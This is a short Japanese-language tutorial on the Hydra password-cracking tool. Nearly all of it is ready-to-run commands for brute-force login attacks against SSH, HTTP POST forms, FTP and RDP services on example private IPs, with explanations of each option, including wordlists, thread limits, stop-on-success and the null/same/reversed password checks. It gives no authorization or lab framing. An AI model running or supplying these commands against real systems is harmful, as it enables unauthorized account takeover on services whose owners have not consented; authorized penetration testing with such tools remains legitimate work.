

## Hydraの使い方

Hydraは、ログイン認証をクラックするためのパスワードクラッキングツールです。特にHTTP、FTP、SSHなど多くのプロトコルに対応しています。

### 1. 基本的な構文

```bash
hydra [オプション] [ターゲットIP] [プロトコル]
```
### 2. SSHに対するブルートフォース攻撃の例
特定のユーザー名とパスワードリストを使ってSSHサーバーに対してブルートフォース攻撃を行う例です。

```bash
hydra -l username -P /path/to/passwordlist.txt ssh://192.168.1.100
```
- -l username: 攻撃対象のユーザー名を指定します。
- -P /path/to/passwordlist.txt: 使用するパスワードリストのパスを指定します。
- ssh://192.168.1.100: 攻撃対象のSSHサーバーのIPアドレスを指定します。

### 3. HTTPフォームへのブルートフォース攻撃の例
特定のウェブサイトのログインフォームに対してブルートフォース攻撃を行う例です。

```bash

hydra -l admin -P /path/to/passwordlist.txt 192.168.1.100 http-post-form "/login.php:username=^USER^&password=^PASS^:F=incorrect"
```
- http-post-form:HTTP POSTリクエストでフォームを送信します。
- /login.php: ログインフォームのあるページのパスを指定します。
- username=^USER^&password=^PASS^: フォームの入力フィールド名を指定し、^USER^と^PASS^でそれぞれユーザー名とパスワードが置き換えられます。
- F=incorrect: ログイン失敗時に表示される文字列を指定します。


### 4. FTPへのブルートフォース攻撃の例
FTPサーバーに対してブルートフォース攻撃を行う例です。

```bash
hydra -l anonymous -p ftp_password 192.168.1.100 ftp
```
- -p ftp_password: 使用する単一のパスワードを指定します。
### 5. RDPへのブルートフォース攻撃の例
WindowsのRDP（リモートデスクトップ）サービスに対してブルートフォース攻撃を行う例です。

```bash

hydra -t 1 -V -f -l administrator -P /path/to/passwordlist.txt rdp://192.168.1.100
```
- -t 1: 1つのスレッドで攻撃を行う（リモートデスクトップのブルートフォース攻撃では推奨される設定）。
- -V: 攻撃の進行状況を表示します。
- -f: パスワードが見つかったら停止します。
### 6. Hydraの結果を出力ファイルに保存する
攻撃結果をファイルに保存するには、-oオプションを使用します。

```bash
hydra -l username -P /path/to/passwordlist.txt ssh://192.168.1.100 -o results.txt
```
- -o results.txt: 結果をresults.txtに保存します。

```bash
hydra -L user.lst -e nsr ftp://10.0.10.13
```
- -L：ユーザリストファイルの指定
- -e nsr：nは"null"で空欄を設定、-sは"same"でユーザ名と同じパスワードを設定、-rは"reverse"でユーザ名を逆転したパスワードを設定
